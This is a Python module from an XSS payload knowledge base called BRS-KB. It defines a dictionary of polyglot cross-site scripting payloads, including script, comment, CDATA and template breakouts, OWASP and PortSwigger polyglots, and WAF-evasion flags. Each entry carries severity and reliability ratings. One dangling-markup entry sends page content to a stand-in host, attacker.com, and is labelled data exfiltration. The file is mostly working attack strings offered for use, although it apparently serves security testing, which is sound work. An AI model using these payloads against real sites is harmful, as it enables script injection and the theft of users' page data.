#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Polyglot XSS Payloads
"""

from ..models import PayloadEntry


POLYGLOT_PAYLOADS = {
    "poly_1": PayloadEntry(
        payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        contexts=["html_content", "javascript", "url"],
        severity="critical",
        cvss_score=9.0,
        description="Ultimate polyglot payload",
        tags=["polyglot", "universal"],
        waf_evasion=True,
        reliability="high",
    ),
    "poly_2": PayloadEntry(
        payload="'-alert(1)-'",
        contexts=["javascript", "html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Simple JS string breakout",
        tags=["polyglot", "string", "breakout"],
        reliability="high",
    ),
    "poly_3": PayloadEntry(
        payload='"-alert(1)-"',
        contexts=["javascript", "html_attribute"],
        severity="high",
        cvss_score=7.5,
        description="Double quote JS string breakout",
        tags=["polyglot", "string", "breakout"],
        reliability="high",
    ),
    "poly_4": PayloadEntry(
        payload="`-alert(1)-`",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Template literal breakout",
        tags=["polyglot", "template", "breakout"],
        reliability="high",
    ),
    "poly_5": PayloadEntry(
        payload="</script><script>alert(1)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Script tag breakout",
        tags=["polyglot", "script", "breakout"],
        reliability="high",
    ),
    "poly_6": PayloadEntry(
        payload="--><script>alert(1)</script><!--",
        contexts=["html_content", "html_comment"],
        severity="critical",
        cvss_score=8.5,
        description="HTML comment breakout",
        tags=["polyglot", "comment", "breakout"],
        reliability="high",
    ),
    "poly_7": PayloadEntry(
        payload="]]><script>alert(1)</script>",
        contexts=["xml", "html_content"],
        severity="critical",
        cvss_score=8.5,
        description="CDATA breakout",
        tags=["polyglot", "cdata", "xml"],
        reliability="medium",
    ),
    "poly_8": PayloadEntry(
        payload="*/alert(1)/*",
        contexts=["javascript", "css"],
        severity="high",
        cvss_score=7.5,
        description="Comment breakout in JS/CSS",
        tags=["polyglot", "comment", "breakout"],
        reliability="high",
    ),
    "poly_9": PayloadEntry(
        payload="%><%=alert(1)%>",
        contexts=["template_injection"],
        severity="critical",
        cvss_score=8.5,
        description="Template injection (ASP/ERB)",
        tags=["polyglot", "template", "asp", "erb"],
        reliability="medium",
    ),
    "poly_10": PayloadEntry(
        payload="${alert(1)}",
        contexts=["template_injection", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Template expression injection",
        tags=["polyglot", "template", "expression"],
        reliability="high",
    ),
    # === OWASP Polyglots ===
    "owasp-polyglot-1": PayloadEntry(
        payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        contexts=["html_content", "javascript", "html_attribute"],
        severity="critical",
        cvss_score=9.0,
        description="OWASP XSS Locator Polyglot - works in multiple contexts",
        tags=["owasp", "polyglot", "multi-context", "waf_bypass"],
        reliability="high",
        waf_evasion=True,
    ),
    "owasp-script-breaker-1": PayloadEntry(
        payload='"></SCRIPT>">\'><<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        contexts=["html_content", "html_attribute", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Universal context breaker with multiple quotes",
        tags=["owasp", "context-breaker", "universal", "polyglot"],
        reliability="high",
        waf_evasion=True,
    ),
    # === PortSwigger Polyglots ===
    "ps-polyglot-javascript-html": PayloadEntry(
        payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        contexts=["html_content", "javascript", "html_attribute", "url"],
        severity="critical",
        cvss_score=9.0,
        description="Multi-context polyglot payload",
        tags=["portswigger", "polyglot", "multi-context", "universal"],
        reliability="high",
        waf_evasion=True,
    ),
    "ps-polyglot-img-svg": PayloadEntry(
        payload="-->'\"--></style></script><svg/onload=alert()>",
        contexts=["html_content", "javascript", "css"],
        severity="critical",
        cvss_score=9.0,
        description="Context breaking polyglot",
        tags=["portswigger", "polyglot", "context-break"],
        reliability="high",
        waf_evasion=True,
    ),
    # === PortSwigger Dangling Markup ===
    "ps-dangling-markup-img": PayloadEntry(
        payload='<img src="https://attacker.com/log?html=',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Dangling markup injection - data exfiltration",
        tags=["portswigger", "dangling-markup", "data-exfil", "scriptless"],
        reliability="medium",
    ),
    "ps-dangling-markup-base": PayloadEntry(
        payload='<base target="',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Dangling markup with base target",
        tags=["portswigger", "dangling-markup", "base", "scriptless"],
        reliability="medium",
    ),
}

POLYGLOT_PAYLOADS_TOTAL = len(POLYGLOT_PAYLOADS)
